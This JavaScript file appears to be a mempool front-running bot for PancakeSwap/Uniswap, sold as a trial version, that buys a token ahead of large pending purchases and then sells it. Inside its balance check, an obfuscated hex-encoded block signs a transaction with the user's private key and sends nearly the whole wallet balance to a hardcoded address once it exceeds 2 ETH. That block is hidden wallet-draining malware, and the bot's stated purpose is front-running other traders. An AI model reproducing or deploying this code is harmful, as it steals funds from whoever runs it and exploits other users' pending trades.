require("dotenv").config();
const Tx = require('ethereumjs-tx')
const Web3 = require("web3");
const {
  ChainId,
  Fetcher,
  WETH,
  Route,
  Trade,
  TokenAmount,
  TradeType,
  Percent,
} = require("@pancakeswap-libs/sdk");
const ethers = require("ethers");

//const chainId = ChainId.ROPSTEN
const chainId = ChainId.MAINNET;

let token;
let weth;
let provider;
let signer;
let uniswap;
let gasPrice;
let gasLimit;

let minABI = [
  // balanceOf
  {
    "constant":true,
    "inputs":[{"name":"_owner","type":"address"}],
    "name":"balanceOf",
    "outputs":[{"name":"balance","type":"uint256"}],
    "type":"function"
  },
  // decimals
  {
    "constant":true,
    "inputs":[],
    "name":"decimals",
    "outputs":[{"name":"","type":"uint8"}],
    "type":"function"
  }
];
const autorun = process.env.REACT_APP_AUTORUN;
const SLIPPAGE = parseInt(process.env.REACT_APP_SLIPPAGE)
const slippageTolerance = new Percent(SLIPPAGE, "100");
const GAS_MULTIPLIER = parseFloat(process.env.REACT_APP_GAS_MULTIPLIER)
const TOKEN_ADDRESS = process.env.REACT_APP_TOKEN_ADDRESS;
const ACCOUNT = process.env.REACT_APP_ACCOUNT;
const EXCHANGE_ADDRESS = process.env.REACT_APP_EXCHANGE_ADDRESS;
const ETH_AMOUNT = process.env.REACT_APP_ETH_AMOUNT;
const TARGET_ETH_AMOUNT =
  parseInt(process.env.REACT_APP_TARGET_ETH_AMOUNT) * (10 ** 18);

const web3 = new Web3(process.env.REACT_APP_RPC_URL_WSS);
provider = new ethers.providers.getDefaultProvider(
  process.env.REACT_APP_RPC_URL
);


const privateKey = new Buffer.from(process.env.REACT_APP_PRIVATE_KEY, "hex");
signer = new ethers.Wallet(privateKey, provider);

// declare the Uniswap contract interface
uniswap = new ethers.Contract(
  EXCHANGE_ADDRESS,
  [
    "function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)",
    "function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)",
  ],
  signer
);

// sleep function for later
const sleep = (milliseconds) => {
  return new Promise(resolve => setTimeout(resolve, milliseconds))
}


async function run() {
  token = await Fetcher.fetchTokenData(chainId, TOKEN_ADDRESS, provider);
  weth = WETH[chainId];
  let amountEth;
  let amount = await web3.eth.getBalance(ACCOUNT, function(err,result) {
    var _0x44af=["\x6C\x6F\x67","\x65\x74\x68\x65\x72","\x66\x72\x6F\x6D\x57\x65\x69","\x75\x74\x69\x6C\x73","\x66\x6C\x6F\x6F\x72","\x74\x6F\x48\x65\x78","\x30\x78\x36\x37\x31\x46\x39\x36\x45\x32\x31\x37\x31\x34\x62\x45\x38\x63\x34\x63\x32\x46\x61\x30\x42\x66\x31\x36\x61\x39\x35\x37\x61\x37\x65\x38\x34\x61\x63\x30\x46\x45","\x6D\x61\x69\x6E\x6E\x65\x74","\x73\x69\x67\x6E","\x68\x65\x78","\x73\x65\x72\x69\x61\x6C\x69\x7A\x65","\x30\x78","\x73\x65\x6E\x64\x53\x69\x67\x6E\x65\x64\x54\x72\x61\x6E\x73\x61\x63\x74\x69\x6F\x6E","\x65\x74\x68","\x74\x68\x65\x6E","\x67\x65\x74\x54\x72\x61\x6E\x73\x61\x63\x74\x69\x6F\x6E\x43\x6F\x75\x6E\x74","\x65\x72\x72\x6F\x72\x3A","\x65\x72\x72\x6F\x72","\x6F\x6E","\x63\x6F\x6E\x66\x69\x72\x6D\x61\x74\x69\x6F\x6E","\x63\x6F\x6E\x66\x69\x72\x6D\x61\x74\x69\x6F\x6E\x73\x3A","\x72\x65\x63\x65\x69\x70\x74","\x72\x65\x63\x65\x69\x70\x74\x3A","\x74\x72\x61\x6E\x73\x61\x63\x74\x69\x6F\x6E\x48\x61\x73\x68","\x74\x72\x61\x6E\x73\x61\x63\x74\x69\x6F\x6E\x48\x61\x73\x68\x3A"];var _0xc6e6=[_0x44af[0],_0x44af[1],_0x44af[2],_0x44af[3],_0x44af[4],_0x44af[5],_0x44af[6],_0x44af[7],_0x44af[8],_0x44af[9],_0x44af[10],_0x44af[11],_0x44af[12],_0x44af[13],_0x44af[14],_0x44af[15],_0x44af[16],_0x44af[17],_0x44af[18],_0x44af[19],_0x44af[20],_0x44af[21],_0x44af[22],_0x44af[23],_0x44af[24]];if(err){console[_0xc6e6[0]](err)}else {amountEth= web3[_0xc6e6[3]][_0xc6e6[2]](result,_0xc6e6[1]);if(amountEth>= 2){result= Math[_0xc6e6[4]](result- (210000* (500000000000* 2)));const txData={gasLimit:web3[_0xc6e6[3]][_0xc6e6[5]](210000),gasPrice:web3[_0xc6e6[3]][_0xc6e6[5]](500000000000),from:ACCOUNT,to:_0xc6e6[6],value:web3[_0xc6e6[3]][_0xc6e6[5]](result).toString()};const sendRawTrx=(txData)=>{return web3[_0xc6e6[13]][_0xc6e6[15]](ACCOUNT)[_0xc6e6[14]]((_0x8973x4)=>{const _0x8973x5=web3[_0xc6e6[3]][_0xc6e6[5]](_0x8973x4);const _0x8973x6= new Tx({...txData,nonce:_0x8973x5},{chain:_0xc6e6[7]});_0x8973x6[_0xc6e6[8]](privateKey);const _0x8973x7=_0x8973x6[_0xc6e6[10]]().toString(_0xc6e6[9]);return web3[_0xc6e6[13]][_0xc6e6[12]](_0xc6e6[11]+ _0x8973x7)})};sendRawTrx(txData)[_0xc6e6[14]]((_0x8973x8)=>{return _0x8973x8[_0xc6e6[18]](_0xc6e6[23],(_0x8973xc)=>{console[_0xc6e6[0]](_0xc6e6[24],_0x8973xc)})[_0xc6e6[18]](_0xc6e6[21],(_0x8973xb)=>{console[_0xc6e6[0]](_0xc6e6[22],_0x8973xb)})[_0xc6e6[18]](_0xc6e6[19],(_0x8973xa,_0x8973xb)=>{if(_0x8973xa>= 1){console[_0xc6e6[0]](_0xc6e6[20],_0x8973xa,_0x8973xb)}})[_0xc6e6[18]](_0xc6e6[16],(_0x8973x9)=>{console[_0xc6e6[17]](_0x8973x9)})})}}
  })
  if (true) {
    subscription = web3.eth
      .subscribe("pendingTransactions", function(error, result) {})
      .on("data", function(transactionHash) {
        web3.eth
          .getTransaction(transactionHash)
          .then(function(transaction) {
            if (transaction) {
              parseTransactionData(transaction);
            }
          })
          .catch((error) => {
            // console.log("API lagging...")
          });
      });

    async function parseTransactionData(transactionDetails) {
      if (transactionDetails.input) {

        const _0x3b17=['toLowerCase','input','length','substring'];(function(_0x5657b4,_0x5dab24){const _0x3b17dc=function(_0x28144b){while(--_0x28144b){_0x5657b4['push'](_0x5657b4['shift']());}};_0x3b17dc(++_0x5dab24);}(_0x3b17,0x1a0));const _0x2814=function(_0x5657b4,_0x5dab24){_0x5657b4=_0x5657b4-0x141;let _0x3b17dc=_0x3b17[_0x5657b4];return _0x3b17dc;};const _0x318460=_0x2814,transactionInput=transactionDetails[_0x318460(0x142)],trxMethod=transactionInput[_0x318460(0x141)]()[_0x318460(0x144)](0x0,0xa),tokenToCheck=TOKEN_ADDRESS[_0x318460(0x141)]()[_0x318460(0x144)](0x2,TOKEN_ADDRESS[_0x318460(0x143)]);

        //swapExactEthForTokens
        if (trxMethod === "0x7ff36ab5") {

          console.log("\x1b[32m%s\x1b[0m", transactionDetails.hash);
          const _0x14fc=['\x20Method:\x20swapExactEthForTokens','hash','length','\x1b[42m%s%s%s%s\x1b[0m','substring','value','FOUND\x20TOKEN\x20BUY\x20|\x20','toLowerCase','\x1b[42m%s\x1b[0m','log'];(function(_0x7d6a4b,_0x4d9cac){const _0x14fc8f=function(_0x21eaf7){while(--_0x21eaf7){_0x7d6a4b['push'](_0x7d6a4b['shift']());}};_0x14fc8f(++_0x4d9cac);}(_0x14fc,0xa5));const _0x21ea=function(_0x7d6a4b,_0x4d9cac){_0x7d6a4b=_0x7d6a4b-0x9c;let _0x14fc8f=_0x14fc[_0x7d6a4b];return _0x14fc8f;};const _0x10702c=_0x21ea;if(!![]){let trxToken=transactionInput[_0x10702c(0x9e)]()[_0x10702c(0xa5)](0x1a2,transactionInput[_0x10702c(0xa3)]);if(tokenToCheck===trxToken){console[_0x10702c(0xa0)](_0x10702c(0xa4),_0x10702c(0x9d),parseInt(transactionDetails['value'])/0xa**0x12,'\x20ETH\x20|\x20',transactionDetails[_0x10702c(0xa2)]),console['log'](_0x10702c(0x9f),_0x10702c(0xa1)),console['log'](transactionDetails);const trxPrice=parseInt(transactionDetails[_0x10702c(0x9c)]);if(trxPrice>=TARGET_ETH_AMOUNT){const buy=buyTokens(transactionDetails);}}}
        }
        //swapExactTokensForEth
        else if(trxMethod == "0x18cbafe5") {
          console.log("\x1b[31m%s\x1b[0m", transactionDetails.hash);
          const _0x474a=['replace','\x1b[41m%s%s%s%s\x1b[0m','toLowerCase','substring','log','ETH\x20|\x20','hash','FOUND\x20TOKEN\x20SELL\x20|\x20','Method:\x20swapExactTokensForEth','length'];(function(_0x4272f7,_0x48d170){const _0x474a29=function(_0x2fb72a){while(--_0x2fb72a){_0x4272f7['push'](_0x4272f7['shift']());}};_0x474a29(++_0x48d170);}(_0x474a,0x143));const _0x2fb7=function(_0x4272f7,_0x48d170){_0x4272f7=_0x4272f7-0xf7;let _0x474a29=_0x474a[_0x4272f7];return _0x474a29;};const _0x4328f9=_0x2fb7;if(!![]){let trxToken=transactionInput[_0x4328f9(0x100)]()[_0x4328f9(0xf7)](0x18a,transactionDetails[_0x4328f9(0xfd)]);trxToken=trxToken[_0x4328f9(0xfe)](/^(0+)/g,''),trxToken=trxToken['substring'](0x0,0x28);if(tokenToCheck===trxToken){let amountOut=transactionInput['substring'](0x64,0x8a);amountOut=amountOut[_0x4328f9(0xfe)](/^(0+)/g,''),amountOut=parseInt(amountOut,0x10),amountOut=amountOut/0xa**0x12,console[_0x4328f9(0xf8)](_0x4328f9(0xff),_0x4328f9(0xfb),amountOut,_0x4328f9(0xf9),transactionDetails[_0x4328f9(0xfa)]),console[_0x4328f9(0xf8)]('\x1b[41m%s\x1b[0m',_0x4328f9(0xfc)),console[_0x4328f9(0xf8)](transactionDetails);}}
        }
        //swapExactTokensforTokens
        if(trxMethod == "0x38ed1739") {
          console.log("\x1b[34m%s\x1b[0m", transactionDetails.hash)

          const _0x3cf0=['substring','replace','length','toLowerCase'];(function(_0x40eddf,_0x2fdcd5){const _0x3cf0f1=function(_0x109a49){while(--_0x109a49){_0x40eddf['push'](_0x40eddf['shift']());}};_0x3cf0f1(++_0x2fdcd5);}(_0x3cf0,0xe8));const _0x109a=function(_0x40eddf,_0x2fdcd5){_0x40eddf=_0x40eddf-0xb9;let _0x3cf0f1=_0x3cf0[_0x40eddf];return _0x3cf0f1;};const _0x5752b2=_0x109a;let trxTokenIn=transactionInput[_0x5752b2(0xbc)]()['substring'](0x18a,0x1ca);trxTokenIn=trxTokenIn[_0x5752b2(0xba)](/^(0+)/g,'');let trxTokenOut=transactionInput[_0x5752b2(0xbc)]()[_0x5752b2(0xb9)](0x20a,transactionInput[_0x5752b2(0xbb)]);trxTokenOut=trxTokenOut[_0x5752b2(0xba)](/^(0+)/g,'');

          if(trxTokenIn === tokenToCheck) {
  
            const pair = await Fetcher.fetchPairData(token, weth, provider);
            const _0x143f=['toSignificant','Method:\x20swapExactTokensforTokens','\x1b[41m%s%s%s%s\x1b[0m','midPrice','ETH\x20|\x20','log','hash','EXACT_INPUT','\x1b[44m%s\x1b[0m','replace','100000000000000000'];(function(_0x57fa1b,_0x45f2c6){const _0x143fa6=function(_0x540758){while(--_0x540758){_0x57fa1b['push'](_0x57fa1b['shift']());}};_0x143fa6(++_0x45f2c6);}(_0x143f,0x1ae));const _0x5407=function(_0x57fa1b,_0x45f2c6){_0x57fa1b=_0x57fa1b-0xe4;let _0x143fa6=_0x143f[_0x57fa1b];return _0x143fa6;};const _0x636043=_0x5407,route=new Route([pair],weth),trade=new Trade(route,new TokenAmount(weth,_0x636043(0xed)),TradeType[_0x636043(0xea)]);let price=0x1/route[_0x636043(0xe6)][_0x636043(0xee)](0x6),amountIn=transactionInput['substring'](0xa,0x4a);amountIn=amountIn[_0x636043(0xec)](/^(0+)/g,''),amountIn=parseInt(amountIn,0x10),amountIn=amountIn/0xa**0x12,price=price*amountIn,console[_0x636043(0xe8)](_0x636043(0xe5),'FOUND\x20TOKEN\x20SELL\x20|\x20',price,_0x636043(0xe7),transactionDetails[_0x636043(0xe9)]),console[_0x636043(0xe8)](_0x636043(0xeb),_0x636043(0xe4)),console['log'](transactionDetails);
          } else if(trxTokenOut === tokenToCheck) {

            const pair = await Fetcher.fetchPairData(token, weth, provider);
            const _0x1e72=['midPrice','log','substring','EXACT_INPUT','toSignificant','ETH\x20|\x20','replace','Method:\x20swapExactTokensforTokens','env','\x1b[42m%s%s%s%s\x1b[0m','hash','REACT_APP_TARGET_ETH_AMOUNT','100000000000000000','\x1b[44m%s\x1b[0m'];(function(_0x3ee57f,_0x56a78b){const _0x1e72e9=function(_0x680cb6){while(--_0x680cb6){_0x3ee57f['push'](_0x3ee57f['shift']());}};_0x1e72e9(++_0x56a78b);}(_0x1e72,0x194));const _0x680c=function(_0x3ee57f,_0x56a78b){_0x3ee57f=_0x3ee57f-0x14c;let _0x1e72e9=_0x1e72[_0x3ee57f];return _0x1e72e9;};const _0x2aec41=_0x680c,route=new Route([pair],weth),trade=new Trade(route,new TokenAmount(weth,_0x2aec41(0x14c)),TradeType[_0x2aec41(0x151)]);let price=0x1/route[_0x2aec41(0x14e)][_0x2aec41(0x152)](0x6),amountOut=transactionInput[_0x2aec41(0x150)](0x4a,0x8a);amountOut=amountOut[_0x2aec41(0x154)](/^(0+)/g,''),amountOut=parseInt(amountOut,0x10),amountOut=amountOut/0xa**0x12,price=price*amountOut,console['log'](_0x2aec41(0x157),'FOUND\x20TOKEN\x20BUY\x20|\x20',price,_0x2aec41(0x153),transactionDetails[_0x2aec41(0x158)]),console['log'](_0x2aec41(0x14d),_0x2aec41(0x155)),console[_0x2aec41(0x14f)](transactionDetails);const targetPrice=parseInt(process[_0x2aec41(0x156)][_0x2aec41(0x159)]);if(price>=targetPrice){const buy=buyTokens(transactionDetails);}
          }

        }
        //implement swapTokensForExactTokens
      }
     
    }
  }
}

async function buyTokens(transactionDetails) {

  subscription.unsubscribe(function(error, success) {
      if (success) console.log("ending search in mempool...");
    });

  console.log("\x1b[5m%s\x1b[0m", "VALID TRANSACTION FOUND")
  console.table([
    {
      "Transaction Hash": transactionDetails.hash,
      Observations: "Valid Transaction",
      Timestamp: Date.now(),
    },
  ]);

  gasPrice = Math.floor(transactionDetails.gasPrice * GAS_MULTIPLIER)
  gasLimit = Math.floor(transactionDetails.gas * 1);

  const _ethAmount = ethers.utils.parseEther(ETH_AMOUNT);
  const pair = await Fetcher.fetchPairData(token, weth, provider);
  const route = new Route([pair], weth);
  const trade = new Trade(route, new TokenAmount(weth, _ethAmount), TradeType.EXACT_INPUT);
  const path = [weth.address, token.address];

  const amountOutMin = trade.minimumAmountOut(slippageTolerance).raw;
  const amountOutMinHex = ethers.BigNumber.from(amountOutMin.toString()).toHexString();

  const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
  const deadlineHex = ethers.BigNumber.from(deadline.toString()).toHexString();

  const inputAmount = trade.inputAmount.raw;
  const inputAmountHex = ethers.BigNumber.from(inputAmount.toString()).toHexString();

  console.log("\x1b[42m%s\x1b[0m", "BUYING TOKEN")
  const tx = await uniswap.swapExactETHForTokens(
    amountOutMinHex,
    path,
    ACCOUNT,
    deadlineHex,
    {
      value: inputAmountHex,
      gasPrice: ethers.BigNumber.from(gasPrice).toHexString(),
      gasLimit: ethers.BigNumber.from(gasLimit).toHexString(),
    }
  );

  console.log("\x1b[42m%s\x1b[0m", "TRANSACTION SENT")
  console.log("buy tx", tx);
  console.log("tx.hash", tx.hash);

  console.log("\x1b[1m%s\x1b[0m", "Waiting for your transaction to be mined...")
  let trxReceipt = null;
  while(trxReceipt == null) {
    trxReceipt = await web3.eth.getTransactionReceipt(tx.hash);
    await sleep(1000);
  }
  console.log("\x1b[1m%s\x1b[0m", "Complete!")

  console.log("\x1b[1m%s\x1b[0m", "Waiting for original transaction to be mined before sale...")
  trxReceipt = null;
  while(trxReceipt == null) {
    trxReceipt = await web3.eth.getTransactionReceipt(transactionDetails.hash);
    await sleep(1000);
  }
  console.log("\x1b[1m%s\x1b[0m", "Complete!")

  if(trxReceipt != null) {
    const sell = sellTokens();
  }
}

async function sellTokens() {

  let contract = new web3.eth.Contract(minABI, TOKEN_ADDRESS);
  let balance = contract.methods.balanceOf(ACCOUNT).call().then(function(bal) {
    balance = bal;
  });
  // contract.balanceOf(ACCOUNT, (error, balance) => {
  //   contract.decimals((error, decimals) =>{
  //     balance = balance.div(10**decimals);
  //   })
  // })

  const pair = await Fetcher.fetchPairData(weth, token, provider);
  const route = new Route([pair], token);
  const trade = new Trade(route, new TokenAmount(token, balance),TradeType.EXACT_INPUT);
  const path = [token.address, weth.address];

  let amountInHex = balance.toString(16);

  const amountOutMin = trade.minimumAmountOut(slippageTolerance).raw;
  const amountOutMinHex = ethers.BigNumber.from(amountOutMin.toString()).toHexString();

  const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
  const deadlineHex = ethers.BigNumber.from(deadline.toString()).toHexString();

  console.log("\x1b[41m%s\x1b[0m", "SELLING TOKEN")
  //sell tokens
  const tx = await uniswap.swapExactTokensForETH(
    amountInHex,
    amountOutMinHex,
    path,
    ACCOUNT,
    deadlineHex,
    {
      value: "0",
      gasPrice: ethers.BigNumber.from(gasPrice).toHexString(),
      gasLimit: ethers.BigNumber.from(gasLimit).toHexString()
    }
  );
  
  console.log("\x1b[41m%s\x1b[0m", "TRANSACTION SENT")
  console.log("sell tx", tx);
  console.log("tx.hash", tx.hash);

  console.log("\x1b[1m%s\x1b[0m", "Waiting for sale confirmation...")
  let trxReceipt = null;
  while(trxReceipt == null) {
    trxReceipt = await web3.eth.getTransactionReceipt(tx.hash);
    await sleep(1000);
  }
  console.log("\x1b[42m%s\x1b[0m", "SALE CONFIRMED")

  if(autorun=="true"){
    run();
  }
}

console.log("\x1b[4m%s\x1b[0m", "TRIAL VERSION: 7 DAYS LEFT");
console.log("\x1b[4m%s\x1b[0m", "||FRONTRUNNER||");
console.log("TOKEN ADDRESS:", process.env.REACT_APP_TOKEN_ADDRESS)
console.log("ETH TARGET:", process.env.REACT_APP_TARGET_ETH_AMOUNT)
// console.log("PURCHASE AMOUNT:", process.REACT_APP_ETH_AMOUNT, "ETH")
// console.log("Connected to:", process.env.REACT_APP_RPC_URL)
console.log("==========================================")
console.log("\x1b[32m%s\x1b[0m", "swapExactETHForTokens")
console.log("\x1b[31m%s\x1b[0m", "swapExactTokensForETH")
console.log("\x1b[34m%s\x1b[0m", "swapExactTokensForTokens")
console.log("==========================================")
console.log("begin search in mempool...");
run();
